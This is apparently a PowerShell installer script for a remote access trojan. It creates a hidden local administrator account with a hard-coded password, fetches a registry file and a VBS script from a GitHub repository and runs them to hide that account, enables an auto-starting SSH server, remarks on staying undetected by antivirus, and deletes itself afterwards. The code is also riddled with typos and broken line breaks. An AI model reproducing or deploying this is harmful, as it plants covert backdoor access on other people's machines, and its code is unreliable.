# builds resources for remote access tool

# random string for directories
function random_text{
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin
function Crreate-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Passwrod -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }    
    end {
    }
}

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# go to temp. make a working directory
mkdir $path
cd $path

# create admin user
Remove-LocalUser -Name "WindowsGuest"
$NewLocalAdmin = "WindowsGuest"
$Password = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# create registery to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg -OutFile 
"$reg_file.reg"

# visual basic script to register the registery
$vbs_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/blob/main/files/confirm.vbs -OutFile 
"$vbs_file.vbs"



# dont disable wdef until need to, not av detectable up until here

Add-WindowsCapability -Online 
-Name OpenSSG.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd
-StartupTpe 'Automatic'

# install the registery
./"$reg_file.reg";"$vsb_file.vbs"

pause
# self delete
cd $initial_dir
del rat_installer.ps1